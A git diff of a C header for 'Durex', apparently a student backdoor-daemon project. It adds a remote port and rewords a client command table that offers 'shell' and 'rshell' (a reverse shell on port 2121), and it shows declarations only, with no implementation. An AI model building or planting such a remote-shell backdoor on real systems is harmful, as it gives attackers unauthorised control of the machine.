@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
-/*   Updated: 2018/08/17 19:53:55 by root             ###   ########.fr       */
+/*   Updated: 2018/08/18 15:23:42 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -26,12 +26,13 @@
 # define SERVER_REPORTER	"/var/log/Durex.log"
 # define SERVER_ADDR		"localhost"
 # define SERVER_PORT		"4242"
+# define SERVER_REMOTE_PORT	"2121"
 # define SERVER_CLIENT_MAX	3
 # define SERVER_CLIENT_BUFF	128
-# define SERVER_COMMANDS	{ "?", "Display this help", &serverHelp },	\
-							{ "shell", "Open a remote shell", &serverShell }, \
-							{ "rshell", "Open a reverse remote shell", &serverRemoteShell }, \
-							{ "quit", "Quit server", &serverQuitClient }, \
+# define SERVER_COMMANDS	{ "?", "Display this help.", &serverHelp },	\
+							{ "shell", "Open a shell.", &serverShell }, \
+							{ "rshell", "Open a reverse shell on port 2121.", &serverRemoteShell }, \
+							{ "quit", "Quit server.", &serverQuitClient }, \
 							{ NULL, NULL, NULL }
 
 typedef struct	s_buff
@@ -97,5 +98,7 @@ int				mystrlen(const char *s1);
 void			*mymemset(void *s, int c, unsigned int n);
 int				mystrcmp(const char *s1, const char *s2);
 char			*myitoa(int n);
+
+void			durexSigterm(int sig);
 
 #endif /* DUREX_H */
